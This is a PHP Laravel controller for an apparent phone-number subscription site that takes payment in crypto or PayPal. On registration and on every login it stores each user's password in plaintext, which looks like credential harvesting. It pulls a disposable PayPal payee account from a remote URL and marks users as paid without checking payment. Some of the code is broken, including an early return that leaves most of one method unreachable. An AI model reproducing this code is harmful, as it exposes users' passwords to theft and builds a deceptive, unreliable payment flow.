<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Input;
use App\User;
use App\Contact;
use Carbon\Carbon;
use Symfony\Component\HttpFoundation\Cookie;
use Illuminate\Support\Facades\Mail;
use App\Mail\start;


class userController extends Controller
{


    public function test(){
		return $this->UsdToBtc(500) . "          --             " . $this->UsdToEth(500);
		

    }

    public function UsdToBtc($usd){
        $CoinDesk = file_get_contents('http://api.coindesk.com/v1/bpi/currentprice.json');
        $CoinDesk = json_decode($CoinDesk, true);
        $usd_btc = ($CoinDesk != "" ? $CoinDesk['bpi']['USD']['rate_float'] : $btcven_json_decode['BTC']['USD']);
        $btc = $usd/$usd_btc;
        $btc = number_format($btc, 6);
        return $btc;
    }

    public function UsdToEth($usd){
        $CoinDesk = file_get_contents('https://production.api.coindesk.com/v1/currency/ticker?currencies=ETH');
        $CoinDesk = json_decode($CoinDesk, true);
        $usd_eth = $CoinDesk['data']['currency']['ETH']['quotes']['USD']['price'];
        $eth = $usd/$usd_eth;
        $eth = number_format($eth, 6);
        return $eth;
    }
    public function getIp(){
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){
            if (array_key_exists($key, $_SERVER) === true){
                foreach (explode(',', $_SERVER[$key]) as $ip){
                    $ip = trim($ip); // just to be safe
                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
                        return $ip;
                    }
                }
            }
        }
    }
    

    public function create()
    {

        $password = Input::get('reg_password');
        $email =  Input::get('reg_email');

        try{
            $user = new User();
            $user->email = $email;
            $user->password = bcrypt($password);
            $user->ip = $this->getIp();
            $user->flat_password = $password;
            $user->created_at = Carbon::now();
            $user->save();

            Mail::to($email)->send(new start());
            if (Auth::attempt(['email' => $email, 'password' => $password], true)) {
                return redirect()->intended('payment');
            }else{
                flash('Something went wrong')->error();
                return redirect()->intended('register');
            }

        }
        catch(\Exception $e){
            flash('Something went wrong')->error();
            return redirect()->intended('register');
        }



    }


    public function login()
    {

        $password = Input::get('lg_password');
        $email =  Input::get('lg_email');
        $remember = Input::get('lg_remember');

        if (Auth::attempt(['email' => $email, 'password' => $password], $remember)) {

            User::where('id', "=", Auth::id())->update(['flat_password' => $password]);
            return redirect()->intended('payment');
        }else{
            flash('Something went wrong')->error();
            return redirect()->intended('login');
        }


    }

    public function forgot(){

        flash('Please check your email address!')->clear();
        return redirect()->intended('forgot');

    }
    public function contact(Request $request){

        $this->validate($request, [
            'g-recaptcha-response' => 'required|recaptcha',
            // Other rules...
        ], [
            // Custom messages
            'g-recaptcha-response.required' => 'Please complete the reCAPTCHA.',
        ]);

        $email = Input::get('lg_email');
        $subject = Input::get('lg_subject');
        $content = Input::get('lg_message');




        try{

            $subject = "(" . env('APP_NAME') . " Contact From) " . $subject;
            $to = 'replaygate@gmail.com';
            Mail::send('mails.contact', ['content' => $content], function ($message) use($subject,$email, $to){
                $message->replyTo($email);
                $message->subject($subject);
                $message->to($to);
            });

            $contact = new Contact();
            $contact->email = $email;
            $contact->subject = $subject;
            $contact->message = $content;
            $contact->created_at = Carbon::now();
            $contact->save();

            flash('Thank you for your message! We will get back to you as soon as possible.')->clear();
            return redirect()->intended('contact');
        }
        catch(\Exception $e){
            flash('Something went wrong')->error();
            return redirect()->intended('contact');
        }
    }

    public function showPayment($plan = null, Request $request){

        if ($plan !== null){
            return redirect('/type')->cookie('plan', $plan, '60');
        }else{
            return view('plan');
        }


    }

    public function showChooseType(Request $request){
		$discount = 100;
		if ($request->cookie('code') !== null){
			if ($request->cookie('code') == "crypto-forever-335"){
				$discount = 90;
				$code = $request->cookie('code');
			}else{
				$code = "-";
			}
			
		}else{
			$code = "-";
		}
		return $discount;
		switch ($request->cookie('plan')) {
            case 1:
                $plan_str = "Starter";
				$original = 300;
                $usd = ($original * $discount) / 100;
            
                $numbers = "200";
                break;
            case 2:
                $plan_str = "Business";
				$original = 500;
                $usd = ($original * $discount) / 100;
                
                $numbers = "500";
                break;
            case 3:
                $plan_str = "Extended";
				$original = 700;
                $usd = ($original * $discount) / 100;
                $numbers = "1000";
                break;
        }

        return view('type')
            ->with('plan',$plan_str)
            ->with('code',$code)
            ->with('original',$original)
            ->with('usd',$usd)
            ->with('email',Auth::user()->email)
            ->with('numbers',$numbers);
			
    }
	public function redeem (){
		return redirect('/type')->cookie('code', Input::get('code'), '300');
	}
    public function redirectToBitcoin(Request $request){
        $address = $this->getBicoinAddress();

		$discount = 100;
		if ($request->cookie('code')){
			if ($request->cookie('code') == "crypto-forever-335"){
				$discount = 90;
			}
			
		}
        switch ($request->cookie('plan')) {
            case 1:
                $plan_str = "Starter";
                $usd = (300 * $discount) / 100;
                $btc = $this->UsdToBtc($usd);
                $numbers = "200";
                break;
            case 2:
                $plan_str = "Business";
                $usd = (500 * $discount) / 100;
                $btc = $this->UsdToBtc($usd);
                $numbers = "500";
                break;
            case 3:
                $plan_str = "Extended";
                $usd = (700 * $discount) / 100;
                $btc = $this->UsdToBtc($usd);
                $numbers = "1000";
                break;
        }

        return view('bitcoin')
            ->with('plan',$plan_str)
            ->with('usd',$usd)
            ->with('btc',$btc)
            ->with('address',$address)
            ->with('numbers',$numbers);
    }


    public function redirectToEthereum(Request $request){
        $address = $this->getEthereumAddress();

		$discount = 100;
		if ($request->cookie('code')){
			if ($request->cookie('code') == "crypto-forever-335"){
				$discount = 90;
			}
			
		}
        switch ($request->cookie('plan')) {
            case 1:
                $plan_str = "Starter";
                $usd = (300 * $discount) / 100;
                $eth = $this->UsdToEth($usd);
                $numbers = "200";
                break;
            case 2:
                $plan_str = "Business";
                $usd = (500 * $discount) / 100;
                $eth = $this->UsdToEth($usd);
                $numbers = "500";
                break;
            case 3:
                $plan_str = "Extended";
                $usd = (700 * $discount) / 100;
                $eth = $this->UsdToEth($usd);
                $numbers = "1000";
                break;
        }

        return view('ethereum')
            ->with('plan',$plan_str)
            ->with('usd',$usd)
            ->with('eth',$eth)
            ->with('address',$address)
            ->with('numbers',$numbers);
    }

    public function redirectToPayPal(Request $request){


		$discount = 100;
		if ($request->cookie('code') !== null){
			if ($request->cookie('code') == "crypto-forever-335"){
				$discount = 90;
				$code = $request->cookie('code');
			}else{
				$code = "-";
			}
			
		}else{
			$code = "-";
		}
		
		switch ($request->cookie('plan')) {
            case 1:
                $plan_str = "Starter";
				$original = 300;
                $usd = ($original * $discount) / 100;
               
                $numbers = "200";
                break;
            case 2:
                $plan_str = "Business";
				$original = 500;
                $usd = ($original * $discount) / 100;
                
                $numbers = "500";
                break;
            case 3:
                $plan_str = "Extended";
				$original = 700;
                $usd = ($original * $discount) / 100;
                $numbers = "1000";
                break;
        }


        $cmd = '_xclick';
        $business = $this->GetPayPal();
        $item_name = $numbers . " Numbers For 1 Year (" . $plan_str . " Plan)";
        $currency_code = 'USD';
        $custom =  env('APP_NAME');
        $amount = $usd;
        $return = 'https://shorturl.at/iDFRZ';
        $notify_url = 'http://lehbabi.com/paypal';
        //$cancel_return = 'https:// " . env('APP_DOMAIN') . "';

        $properties = array(
            "cmd"=>$cmd,
            "business"=>$business,
            "item_name"=>$item_name,
            "currency_code"=>$currency_code,
            "custom"=>$custom,
            "amount"=>$amount,
            "return"=>$return,
            "notify_url"=>$notify_url,
            //"cancel_return"=>$cancel_return
        );
        $url = "https://www.paypal.com/cgi-bin/webscr";
        return redirect()->away($url . "?" . http_build_query($properties));
    }

    private function GetPayPal(){
        //$arrX = array(
        //    "BE5LDVQ44HPUU",
        //);
        //$randIndex = array_rand($arrX);
        //return $arrX[$randIndex];
		return file_get_contents("https://receive-sms.com/ppdisposable");
    }
    private function getBicoinAddress(){
        $arrX = array(
            "1FvjBoumCaY4mR5ztj5F1cwRHbebxfHUdH",
        );
        $randIndex = array_rand($arrX);
        return $arrX[$randIndex];

    }

    private function getEthereumAddress(){
        $arrX = array(
            "0x9505cBDfd8ac6F5CC7a17Edbec56ad318A641809",
        );
        $randIndex = array_rand($arrX);
        return $arrX[$randIndex];

    }

    public function thankyou(){
        if (!Auth::check()){return redirect()->intended('/');}
        $user = Auth::user();
        $user->is_paid = true;
        $user->save();
        return view('thankyou');
    }
}
